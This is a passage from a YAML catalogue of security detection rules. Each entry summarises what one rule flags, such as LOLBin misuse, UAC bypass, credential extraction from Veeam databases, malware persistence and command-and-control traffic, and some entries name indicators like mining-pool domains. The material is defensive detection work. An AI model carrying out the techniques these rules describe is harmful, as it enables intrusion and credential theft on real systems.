    utilizing it for malicious purposes. The rule identifies the execution of iexpress.exe
    with specific command line arguments, particularly when the binaries are located
    in directories that can be deemed suspicious, such as various Temp folders and
    system tasks directories. This detection aims to flag potentially unauthorized
    or harmful package creation attempts.
  Updated-Date: '2024_09_04'
b2ddd389-f676-4ac4-845a-e00781a48e5f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c5e2e13748a810bb21e75c6741e01ac8
  Ruleset: core
  Summary: This rule detects the misuse of SettingSyncHost.exe, a legitimate Windows
    system process, to execute a hijacked binary. The focus is on identifying instances
    where SettingSyncHost.exe is parented by a command line execution involving 'cmd.exe
    /c', 'RoamDiag.cmd', and '-outputpath'. This behavior may indicate an attempt
    to use SettingSyncHost.exe as a living-off-the-land binary (LOLBin) for executing
    malicious payloads, evading detection and defenses.
  Updated-Date: '2024_09_03'
b2e60816-96b2-45bd-ba91-b63578c03ef6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ea738275f2286637eadfd190545f7176
  Ruleset: emerging-threats
  Summary: This rule detects the creation of a service named "WerFaultSvc," which
    is used by the SNAKE malware as a mechanism for persistence. SNAKE malware, as
    described by CISA, is known for establishing long-term access on compromised systems.
    The detection is focused on events involving the Windows Service Control Manager,
    specifically looking for Event ID 7045 and certain characteristics of the service's
    ImagePath, such as starting with 'C:\Windows\WinSxS\' and ending with '\WerFault.exe'.
  Updated-Date: '2024_09_03'
b30a8bc5-e21b-4ca2-9420-0a94019ac56a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cbdc49c04cf1e17f9c08a7228109d9a5
  Ruleset: sigmahq
  Summary: This rule detects the execution of VisualUiaVerifyNative.exe, a legitimate
    Windows SDK utility that can be used for Application Whitelisting (AWL) bypass.
    Microsoft has included it in their list of recommended block rules because of
    its potential misuse in bypassing security controls. It specifically monitors
    process creation logs for instances where the file VisualUiaVerifyNative.exe is
    executed.
  Updated-Date: '2024_09_04'
b3503044-60ce-4bf4-bbcb-e3db98788823:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3df6fd118fee1baba9917dd58ab8c812
  Ruleset: core
  Summary: This rule detects the use of an undocumented method to load a Dynamic Link
    Library (DLL) via the Local Security Authority Subsystem Service (LSASS) process
    in Windows by monitoring specific registry keys related to the Windows Directory
    Service. This technique could be used by malware such as Mimikatz to gain persistence
    or execute code within the LSASS process, which manages user access tokens and
    allows high levels of access within a system. The detection focuses on registry
    events involving certain keys and the presence of specific details without matching
    known legitimate instances.
  Updated-Date: '2024_09_03'
b3512211-c67e-4707-bedc-66efc7848863:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 351d5bec2f030dcba0e94110bd3a2663
  Ruleset: sigmahq
  Summary: This rule detects a potential PowerShell downgrade attack by identifying
    instances where PowerShell is executed with version parameters indicative of downgrading
    to the older 2.0 engine version. The rule examines the command line parameters
    used during the execution of 'powershell.exe' to pinpoint any occurrences of specific
    version flags, which could be leveraged to bypass modern security mechanisms.
  Updated-Date: '2024_09_04'
b36d01a3-ddaf-4804-be18-18a6247adfcd:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6266abf64c37e929103a2625faf831b2
  Ruleset: sigmahq
  Summary: This rule detects the use of the "Add-WindowsCapability" PowerShell cmdlet,
    which is used to add Windows capabilities such as "OpenSSH." Specifically, it
    monitors the execution of PowerShell or pwsh processes where the command line
    includes the "Add-WindowsCapability" cmdlet and the term "OpenSSH." This activity
    could indicate the installation or enabling of OpenSSH server or client components
    on a Windows system. While this could be a legitimate action performed by administrators,
    it could also signify unauthorized or malicious changes.
  Updated-Date: '2024_09_04'
b377ddab-502d-4519-9e8c-5590033d2d70:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c26d4314ba5f1e9e7de9196a51e14bc8
  Ruleset: emerging-threats
  Summary: This rule detects a PowerShell script utilized by the Lace Tempest Advanced
    Persistent Threat (APT) group to eliminate traces from compromised servers. The
    script exploits the CVE-2023-47246 vulnerability, as reported by the SysAid Team.
    Specific identifiers within the script include terms related to cleaning logs,
    manipulating user files, removing items in the Tomcat directory, references to
    SysAidServer, and commands that induce sleep and loop conditions. This rule aims
    to identify malicious activities targeting Windows systems through PowerShell
    script execution.
  Updated-Date: '2024_09_03'
b37998de-a70b-4f33-b219-ec36bf433dc0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e53df0c11affad218168fbdb79ae49aa
  Ruleset: sigmahq
  Summary: This rule detects the execution of PingCastle, a tool used for rapidly
    assessing the security level of an Active Directory environment. The detection
    focuses on instances where PingCastle is run from potentially suspicious or uncommon
    locations, indicated by specific parent processes and paths. Key identifiers include
    the presence of PingCastle executable (PingCastle.exe), its related command-line
    arguments, and parent processes originating from directories like Temp, AppData,
    or Users. The rule looks for specific usage patterns of PingCastle, such as various
    scanner commands and health check parameters, to identify potentially malicious
    execution scenarios.
  Updated-Date: '2024_09_04'
b3ad3c0f-c949-47a1-a30e-b0491ccae876:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2aff10c9fbbd5ef743d4a68a75662ba8
  Ruleset: sigmahq
  Summary: This rule detects uncommon network connections to Active Directory Web
    Services (ADWS) on port 9389 from processes that are not typically associated
    with ADWS management tasks. It ensures that connections originating from common
    binaries involved in Active Directory operations, such as `dsac.exe`, Microsoft
    Monitoring Agent, and various instances of PowerShell, are filtered out. This
    helps to identify potential unauthorized or suspicious access attempts while reducing
    false positives from legitimate management applications that interact with Active
    Directory.
  Updated-Date: '2024_09_04'
b3cec4e7-6901-4b0d-a02d-8ab2d8eb818b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 389e2c9ac74fe9917881dc051e0561a9
  Ruleset: sigmahq
  Summary: This rule detects file time attribute changes on Linux systems, which could
    be an attempt to hide the creation or modification of files. This activity is
    linked to defense evasion tactics and could indicate malicious actions aimed at
    masking the presence of new or altered files. The rule triggers when specific
    commands and parameters commonly used to alter file timestamps, such as 'touch'
    with options like '-t', '-acmr', '-d', or '-r', are executed.
  Updated-Date: '2024_09_04'
b3d34dc5-2efd-4ae3-845f-8ec14921f449:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f747d8206df74004b146fea979d02731
  Ruleset: sigmahq
  Summary: This rule detects browsers starting with remote debugging flags, a technique
    often used to perform browser injection attacks. Specific command line indicators
    for Chromium-based browsers and Firefox are monitored to identify such behavior.
  Updated-Date: '2024_09_04'
b3d57a5c-c92e-4b48-9a79-5f124b7cf964:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 10de6db76071decb47ce53e1affd9f20
  Ruleset: core
  Summary: This rule detects when a stored procedure in Microsoft SQL Server (MSSQL)
    is set or cleared for automatic execution. A stored procedure configured for automatic
    execution will run each time a SQL Server instance starts. This behavior can be
    indicative of attempts to establish persistence by adversaries. The event is identified
    by specific log entries generated when the "sp_procoption" system stored procedure
    is used.
  Updated-Date: '2024_09_03'
b3e6418f-7c7a-4fad-993a-93b65027a9f1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 454163f14055c99191ac3cc25cc22b1f
  Ruleset: sigmahq
  Summary: This rule detects DNS query requests to Visual Studio Code tunnel domains.
    Such queries can indicate that attackers are abusing this feature to establish
    a reverse shell or maintain persistence on a compromised machine. The specified
    domains end with ".tunnels.api.visualstudio.com". Although legitimate use of Visual
    Studio Code tunnels will also generate these queries, this activity is associated
    with command-and-control tactics, specifically under the ATT&CK technique T1071.001.
  Updated-Date: '2024_09_04'
b439f47d-ef52-4b29-9a2f-57d8a96cb6b8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 46b62d551cae9d7fe8dd8ed031f87a9d
  Ruleset: sigmahq
  Summary: This rule detects activity associated with the WMI script host process
    "scrcons.exe" loading specific scripting DLLs, which could indicate the presence
    of WMI ActiveScriptEventConsumers. This detection focuses on identifying the use
    of DLLs such as 'vbscript.dll', 'wbemdisp.dll', 'wshom.ocx', and 'scrrun.dll'
    being loaded by "scrcons.exe". These DLLs are significant as their use can suggest
    lateral movement, privilege escalation, or persistence mechanisms associated with
    malicious activities.
  Updated-Date: '2024_09_04'
b48492dc-c5ef-4572-8dff-32bc241c15c8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e43b757d555a53a43a6207f2bec559e1
  Ruleset: sigmahq
  Summary: This rule detects the load of the RstrtMgr.dll (Restart Manager DLL) by
    suspicious processes. This library has been exploited in ransomware campaigns,
    such as those involving Conti and Cactus ransomware, to terminate processes that
    would otherwise prevent file encryption by locking them. Additionally, the BiBi
    wiper for Windows has also employed this DLL recently. It can be used for purposes
    like anti-analysis by shutting down specific processes.
  Updated-Date: '2024_09_04'
b4926b47-a9d7-434c-b3a0-adc3fa0bd13e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4106fc73ccbb5116bbf1dc694fb663e3
  Ruleset: core
  Summary: This rule detects files with double extensions, such as ".docx.exe" or
    ".jpg.zip," which are indicative of malware attempts to exploit Windows' default
    behavior of hiding known file extensions. This technique is used to disguise malicious
    files by appending a seemingly benign extension to the actual harmful file. Examples
    of file types commonly used for this purpose include ".exe", ".iso", ".rar", and
    ".zip" combined with typical document or image file extensions like ".docx", ".pdf",
    and ".jpg".
  Updated-Date: '2024_09_03'
b494b165-6634-483d-8c47-2026a6c52372:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d250a6e756135efa7fc7e02e83c8fb36
  Ruleset: sigmahq
  Summary: "This rule detects suspicious requests to the Telegram API that do not\
    \ include the usual Telegram User-Agent strings, which are commonly associated\
    \ with legitimate Telegram bots. The rule identifies access to 'api.telegram.org'\
    \ and filters out requests containing User-Agent strings that indicate normal\
    \ Telegram bot usage, such as those containing 'Telegram' or 'Bot'. This can help\
    \ identify potential misuse of the Telegram API, such as by malware or unauthorized\
    \ scripts attempting to leverage Telegram\u2019s services for command-and-control\
    \ or evasion purposes."
  Updated-Date: '2024_09_04'
b4a6d707-9430-4f5f-af68-0337f52d5c42:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9d75ef600d2e21023da6d373ef1d97d2
  Ruleset: core
  Summary: This rule detects sign-in attempts that fail due to Conditional Access
    policies in an Azure environment. Specifically, it identifies attempts where the
    failure is marked by the ResultType code 53003, indicating that access was blocked
    because Conditional Access requirements were not met. This can help identify potential
    security issues such as misconfigured service accounts, system misconfigurations,
    or activities from vulnerability scanners.
  Updated-Date: '2024_09_03'
b4c8da4a-1c12-46b0-8a2b-0a8521d03442:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e5f951b44aac98a22ede6e0b310b737a
  Ruleset: core
  Summary: This rule detects restricted access to applications enforced by Software
    Restriction Policies (SRP). It monitors events where access to a specific application
    or file is blocked by the administrator through various SRP policies. These events
    include restrictions by default policy level, location-based rules, software publisher
    policies, and specific policy rules, identified by Event IDs 865, 866, 867, 868,
    and 882. The rule helps identify defense evasion attempts by ensuring that unauthorized
    software execution is controlled within a Windows environment.
  Updated-Date: '2024_09_03'
b4e6b016-a2ac-4759-ad85-8000b300d61e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: be020cf31c936f31f670054b1db37db8
  Ruleset: sigmahq
  Summary: This rule detects instances where a TFTP service on an OpenCanary node
    has received a request, potentially indicating an attempt at exfiltration.
  Updated-Date: '2024_09_04'
b5281f31-f9cc-4d0d-95d0-45b91c45b487:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6316f789b8b651a835d9e5f14ad3cded
  Ruleset: emerging-threats
  Summary: This rule detects the exploitation of a remote code execution vulnerability
    in Windows DNS servers described by CVE-2020-1350. It identifies suspicious subprocesses
    that originate from the DNS executable file, while filtering out known benign
    processes. This vulnerability, when exploited, can potentially lead to domain
    administrator compromise, posing significant security risks to the affected systems.
  Updated-Date: '2024_09_03'
b52e84a3-029e-4529-b09b-71d19dd27e94:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0b5f134a2d47d697d9d022e0b45c7110
  Ruleset: sigmahq
  Summary: This rule detects the execution of AnyDesk, a remote access tool commonly
    used for desktop support and command and control channels by adversaries. The
    detection identifies processes associated with AnyDesk by matching the image name,
    product description, and company information specific to AnyDesk Software GmbH.
    While AnyDesk is a legitimate software commonly used for remote technical support,
    its presence in certain environments may indicate unauthorized remote access attempts.
  Updated-Date: '2024_09_04'
b53317a0-8acf-4fd1-8de8-a5401e776b96:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0a7534e50f61a1a2791f90dabe3cbd7f
  Ruleset: sigmahq
  Summary: This rule detects the removal or uninstallation of an application using
    "Wmic.EXE". It specifically monitors for the execution of the Windows Management
    Instrumentation Command-line (WMIC) tool with commands that include 'call' and
    'uninstall'. The rule focuses on process creation events within the Windows operating
    system.
  Updated-Date: '2024_09_04'
b5495d8d-24ad-4a44-8caf-ceae9a07a5c2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: baa61177ef4b3839a8f362945d91c782
  Ruleset: emerging-threats
  Summary: This rule detects process creation activities that are indicative of the
    Diamond Sleet Advanced Persistent Threat (APT). Specifically, it flags the presence
    of a distinctive command line pattern ('uTYNkfKxHiZrx3KJ') associated with this
    threat group. Diamond Sleet APT is noted for exploiting vulnerabilities and targeting
    systems, potentially for espionage or other malicious activities. The detection
    focuses on process creation events on Windows operating systems. The risk of false
    positives for this detection is considered unlikely, suggesting a high level of
    confidence in the rule's accuracy in identifying malicious activity.
  Updated-Date: '2024_09_03'
b5522a23-82da-44e5-9c8b-e10ed8955f88:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 77112df7ac8f3f65954caf049c933139
  Ruleset: sigmahq
  Summary: This rule detects the execution of batch scripts via PowerShell on Windows
    systems. Specifically, it identifies the use of the `Start-Process` command within
    PowerShell scripts that reference batch files such as `.cmd` or `.bat`. Batch
    files can contain a series of commands to perform various automated tasks and
    are often used to control system operations. This detection helps in identifying
    potential misuse of the Windows command shell by adversaries for malicious activities
    while acknowledging the possibility of legitimate administrative uses.
  Updated-Date: '2024_09_04'
b55ca2a3-7cff-4dda-8bdd-c7bfa63bf544:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: de59cdec2acd9511805d76899f01e02a
  Ruleset: core
  Summary: This rule detects DNS queries to addresses ending in ".onion," which are
    associated with Tor routing networks. This activity may indicate the use of Tor
    for command-and-control purposes, representing a potential security threat.
  Updated-Date: '2024_09_03'
b55d23e5-6821-44ff-8a6e-67218891e49f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7bef8126a51bf62af98e68dd882b00b1
  Ruleset: core
  Summary: This rule detects the running of the Hybrid Connection Manager service
    on an endpoint by looking for specific event IDs (40300, 40301, 40302) and keywords
    such as "HybridConnection," "sb://," "servicebus.windows.net," and "HybridConnectionManage."
    The Hybrid Connection Manager is typically utilized for building secure, scalable
    cloud solutions, and may be legitimately used via Azure function apps. However,
    detecting its activity could indicate an attempt to establish persistence on the
    system, as it falls under the MITRE ATT&CK technique T1554 for persistence.
  Updated-Date: '2024_09_03'
b5746143-59d6-4603-8d06-acbd60e166ee:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: aaedd076542ff1f0288578ea5348c5b6
  Ruleset: sigmahq
  Summary: This rule detects uncommon child processes spawned by AddInUtil.exe, the
    Add-In deployment cache updating utility. Unusual activity involving this utility
    may indicate potential misuse to execute custom payloads via Addins.Store, a known
    attack method. This rule aims to identify such suspicious behavior as part of
    defense-evasion techniques.
  Updated-Date: '2024_09_04'
b57ba453-b384-4ab9-9f40-1038086b4e53:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f3b2a0cb462e4f1f2ef343ea7d94ebd2
  Ruleset: core
  Summary: This rule detects the extraction of credentials from the VeeamBackup database
    using Sqlcmd.exe on Windows systems. It identifies the execution of Sqlcmd.exe
    with command-line instructions that include specific queries targeting the `[VeeamBackup].[dbo].[Credentials]`
    table. This activity is indicative of credential dumping, which can be related
    to malicious practices or ransomware activities like those reported in connection
    with Diavol ransomware.
  Updated-Date: '2024_09_03'
b593fd50-7335-4682-a36c-4edcb68e4641:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3a0bc46d8d982c34d9c56e8b8582f083
  Ruleset: core
  Summary: This rule detects suspicious DNS queries associated with Monero mining
    pools. Monero is a cryptocurrency known for its privacy features, and mining pools
    are often used to combine computational resources to improve mining efficiency.
    The rule identifies specific DNS queries to well-known Monero mining pool domains
    such as 'pool.minexmr.com', 'xmr.nanopool.org', and 'xmr.hashcity.org', among
    others. These queries can indicate the presence of unauthorized or malicious cryptocurrency
    mining activity within a network.
  Updated-Date: '2024_09_03'
b59c98c6-95e8-4d65-93ee-f594dfb96b17:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5882d71b9f7bdd271309efb21a6e9d20
  Ruleset: sigmahq
  Summary: This rule detects POST requests to the F5 BIG-IP iControl Rest API "bash"
    endpoint, which allows the execution of commands on the BIG-IP system. It identifies
    potential attempts to exploit this API endpoint by monitoring for HTTP POST requests
    that target the specific URI associated with executing bash commands. This behavior
    can be indicative of unauthorized command execution attempts aimed at gaining
    initial access or performing malicious activities on the BIG-IP system.
  Updated-Date: '2024_09_04'
b5aa7d60-c17e-4538-97de-09029d6cd76b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 17daedee35332f7c05733b683b136972
  Ruleset: sigmahq
  Summary: This rule detects the execution of AppX packages on Windows systems that
    have a digital signature matching known suspicious or malicious certificates.
    Specifically, it identifies packages signed by Foresee Consulting Inc., which
    are associated with potentially harmful software or activities, and triggers an
    alert based on this digital signature information.
  Updated-Date: '2024_09_04'
b5b78988-486d-4a80-b991-930eff3ff8bf:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6a32f0c18cb641176bc715b84d28e7f7
  Ruleset: sigmahq
  Summary: This rule detects the creation or modification of a PowerShell profile,
    which may signal suspicious activity because a PowerShell profile can be leveraged
    for persistence by attackers. Modifications in specific files such as `Microsoft.PowerShell_profile.ps1`
    and `PowerShell\profile.ps1` among others are monitored. The rule helps identify
    possible attempts of privilege escalation or maintaining unauthorized access on
    a Windows system.
  Updated-Date: '2024_09_04'
b5c7395f-e501-4a08-94d4-57fe7a9da9d2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e4797689e5bb44192919882bc1197c5c
  Ruleset: sigmahq
  Summary: This rule detects the usage of "cdb.exe" to execute arbitrary processes
    or commands from a debugger script file. Cdb.exe, also known as Console Debugger,
    is a legitimate Windows debugging tool that, if misused, can be leveraged by attackers
    to launch malicious activities, bypass defenses, or evade detection. The detection
    criteria focus on the appearance of "cdb.exe" in the process creation logs, specifically
    looking for command line parameters associated with debugger scripts. While legitimate
    use by developers or system administrators could trigger this rule, it is essential
    to differentiate between standard and potentially harmful activities.
  Updated-Date: '2024_09_04'
b5de0c9a-6f19-43e0-af4e-55ad01f550af:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 93760286adbcca7947a26674a7ce1769
  Ruleset: sigmahq
  Summary: This rule detects the loading of unsigned or untrusted DLLs by Windows
    utilities such as InstallUtil.exe, RegAsm.exe, RegSvcs.exe, regsvr32.exe, and
    rundll32.exe. Adversaries often exploit these programs to proxy the execution
    of malicious code, bypassing security measures by inserting dubious libraries.
  Updated-Date: '2024_09_04'
b6188d2f-b3c4-4d2c-a17d-9706e0851af0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9486d075a6541f09eefc3b39f7b5028a
  Ruleset: sigmahq
  Summary: This rule detects potential DLL sideloading of "goopdate.dll," a dynamic
    link library typically used by googleupdate.exe. The detection focuses on instances
    where the file "goopdate.dll" is loaded outside expected directories, considering
    common false positives such as legitimate Google Chrome installations from user
    locations and other third-party Chromium-based browsers. Filters are applied to
    exclude these normal activities to minimize false positives and enhance detection
    accuracy for actual malicious sideloading attempts.
  Updated-Date: '2024_09_04'
b61e87c0-50db-4b2e-8986-6a2be94b33b0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 539c075876a249351a084a57ec7f8c3c
  Ruleset: sigmahq
  Summary: This rule detects changes to the "DsrmAdminLogonBehavior" registry value.
    The Directory Services Restore Mode (DSRM) account is a local administrator account
    created during the promotion of a Domain Controller (DC) to assist in restoring
    Active Directory (AD) backups or recovering the server from failure. This account's
    password is rarely changed, making it a target for attackers to maintain persistence
    and access to an organization's Active Directory. The rule monitors the "DsrmAdminLogonBehavior"
    value to identify if the account behavior is altered, which could indicate malicious
    activity trying to exploit the DSRM account. The "DsrmAdminLogonBehavior" value
    can be set to "0" (usable only if the DC starts in DSRM), "1" (usable if the local
    AD DS service is stopped), or "2" (always usable).
  Updated-Date: '2024_09_04'
b640c0b8-87f8-4daa-aef8-95a24261dd1d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5792c4b04e15ef90f715474e1720541a
  Ruleset: sigmahq
  Summary: This rule detects Windows DCE-RPC functions that indicate execution techniques
    on a remote system. Specifically, it monitors operations such as 'JobAdd' on the
    'atsvc' endpoint, 'SchRpcEnableTask,' 'SchRpcRegisterTask,' and 'SchRpcRun' on
    the 'ITaskSchedulerService' endpoint, and 'ExecMethod' and 'ExecMethodAsync' on
    the 'IWbemServices' endpoint. Additionally, it tracks 'CreateServiceA,' 'CreateServiceW,'
    'StartServiceA,' and 'StartServiceW' operations on the 'svcctl' endpoint. These
    operations are typically associated with remote execution activities. This monitoring
    is crucial for detecting potentially malicious actions, though some detected activities
    may be legitimate administrative tasks or part of routine Windows management processes.
  Updated-Date: '2024_09_04'
b6457d63-d2a2-4e29-859d-4e7affc153d1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e828d543b0c2b3413d1a66cdd506de9b
  Ruleset: sigmahq
  Summary: This rule detects attempts to use dnscmd.exe to enumerate the DNS zones
    of a domain. DNS zones are used to host DNS records for a specific domain. By
    monitoring process creation events for instances of dnscmd.exe, it identifies
    command-line arguments such as '/enumrecords', '/enumzones', '/ZonePrint', and
    '/info', which indicate activities related to discovering DNS information.
  Updated-Date: '2024_09_04'
b64a026b-8deb-4c1d-92fd-98893209dff1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3c29ee6f3432daebc1a79a9674844997
  Ruleset: core
  Summary: This rule detects the installation and execution of Chrome VPN extensions
    through the Windows registry. It monitors registry objects within the path 'Software\Wow6432Node\Google\Chrome\Extensions'
    that end with 'update_url' and contain specific VPN-related identifiers. The identifiers
    correspond to popular Chrome VPN extensions such as ZenMate VPN, Hola Free VPN,
    Hotspot Shield, and NordVPN, among others. The rule aims to identify potential
    security risks associated with installing or running these VPN extensions via
    registry modifications.
  Updated-Date: '2024_09_03'
b655a06a-31c0-477a-95c2-3726b83d649d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 10b22d51c57065f5d8946139f0a9a6bc
  Ruleset: sigmahq
  Summary: This rule detects suspicious child processes initiated by "userinit.exe"
    that are not typically associated with legitimate user activity. Specifically,
    it looks for child processes where the parent image is "userinit.exe" and excludes
    processes related to legitimate commands involving "\netlogon\" and known instances
    of "explorer.exe." This behavior is often indicative of defense evasion techniques,
    such as those classified under ATT&CK T1055. Potential false positives may include
    administrative scripts.
  Updated-Date: '2024_09_04'
b66474aa-bd92-4333-a16c-298155b120df:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1a41accb398ee9fe343d34cfa8c7e34d
  Ruleset: core
  Summary: This rule detects suspicious PowerShell executions via a scheduled task,
    where the commands end with flags designed to conceal the PowerShell instance
    rather than execute scripts or commands directly. This behavior may indicate persistence
    mechanisms exploiting PowerShell's "Get-Variable" technique, as observed in malware
    like Colibri Loader. The detection focuses on processes initiated by the Windows
    system process `svchost.exe` with specific command-line arguments, which suggest
    potential malicious behavior intended to maintain persistence on the system.
  Updated-Date: '2024_09_03'
b6676963-0353-4f88-90f5-36c20d443c6a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f191fea848faa5225e2a3adea43759c8
  Ruleset: sigmahq
  Summary: This rule detects potentially suspicious child processes initiated by Wscript
    or Cscript, such as rundll32 with uncommon exports or PowerShell spawning rundll32
    or regsvr32. These behaviors have been associated with malware like Pikabot and
    Qakbot, which utilize similar techniques. The detection focuses on specific process
    creations that indicate the use of cmd.exe, powershell.exe, or pwsh.exe, as well
    as suspicious command line options including mshta, rundll32, regsvr32, and msiexec.
    Filters are applied to exclude known benign uses of rundll32, such as "UpdatePerUserSystemParameters,"
    "PrintUIEntry," and "ClearMyTracksByProcess." Potential false positives may arise
    from legitimate administrative or third-party software scripts, necessitating
    further investigation and filtering.
  Updated-Date: '2024_09_04'
b697e69c-746f-4a86-9f59-7bfff8eab881:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: de210467833b31b263f03da08c0880fe
  Ruleset: core
  Summary: 'This rule detects the pattern of User Account Control (UAC) Bypass using
    scheduled tasks and variable expansion of cleanmgr.exe. It focuses on identifying
    the execution of the disk cleanup utility (cleanmgr.exe) with the /autoclean and
    /d C: parameters initiated by the svchost.exe process running under the Schedule
    service with high or system integrity levels. This behavior is indicative of an
    attempted UAC bypass technique documented as UACMe 34.'
  Updated-Date: '2024_09_03'
b69888d4-380c-45ce-9cf9-d9ce46e67821:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fb76387a5a23e8fb3e2345dd31aa5eaa
  Ruleset: sigmahq
  Summary: This rule detects the creation of an Alternate Data Stream (ADS) on a Windows
    system containing an executable file, identifiable by a non-empty Import Hash
    (Imphash). The Imphash is logged using tools like Sysmon, enabling the detection
    of suspicious behavior associated with defense evasion techniques. Although legitimate
    installers and programs can embed binaries in ADS, some false positives may occur,
    notably from browser processes and similar applications.
  Updated-Date: '2024_09_04'
b6b49cd1-34d6-4ead-b1bf-176e9edba9a4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7cc15a3e9d780c507f986bab94167a77
  Ruleset: core
  Summary: This rule detects the presence of reversed PowerShell commands in the `CommandLine`,
    a common method of obfuscation employed by attackers. It monitors process creation
    events on Windows systems and identifies reversed keywords typically seen in malicious
    PowerShell activity. Some of the targeted keywords include 'hctac' (catch), 'kaerb'
    (break), 'dnammoc' (command), 'eliFd' (File), and 'tneilCbeW' (WebClient), among
    others. The rule aims to differentiate genuine usage from potential threats by
    excluding instances where PowerShell commands are encoded, thereby reducing false
    positives. The goal is to highlight activity that could indicate defense evasion
    or execution of obfuscated commands.
  Updated-Date: '2024_09_03'
b6d235fc-1d38-4b12-adbe-325f06728f37:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 518ea8031023b6cea5d9d4f54e6afb01
  Ruleset: core
  Summary: This rule detects various indicators of the execution of the Microsoft
    Connection Manager Profile Installer, known as CMSTP. The detection focuses on
    registry events containing references to '\cmmgr32.exe'. CMSTP can be used for
    code execution and User Account Control (UAC) bypass, often viewed as a defense
    evasion and execution technique. The rule captures relevant CommandLine, ParentCommandLine,
    and Details fields to identify potential misuse of CMSTP, although legitimate
    use in modern enterprise environments is considered unlikely.
  Updated-Date: '2024_09_03'
b6d98a4f-cef0-4abf-bbf6-24132854a83d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3f74fbf54de5c82b89a9e57a440e4f70
  Ruleset: sigmahq
  Summary: This rule detects the execution of GoToAssist, a legitimate desktop support
    and remote access software developed by LogMeIn, Inc. Adversaries might use GoToAssist
    to establish an interactive command and control channel within target systems,
    taking advantage of its common allowance in application control policies. This
    tool, along with similar software like VNC, Ammyy, and TeamViewer, is frequently
    leveraged by adversaries to bypass security measures under the guise of legitimate
    usage.
  Updated-Date: '2024_09_04'
b6e04788-29e1-4557-bb14-77f761848ab8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6f1d418a16d372596bdef3f762e45e09
  Ruleset: sigmahq
  Summary: This rule detects potentially suspicious file downloads from file-sharing
    domains using PowerShell.exe on Windows systems. It examines process creation
    logs and looks for instances where PowerShell executable or command-line tools
    such as PowerShell.exe or pwsh.exe are used to download files. It specifically
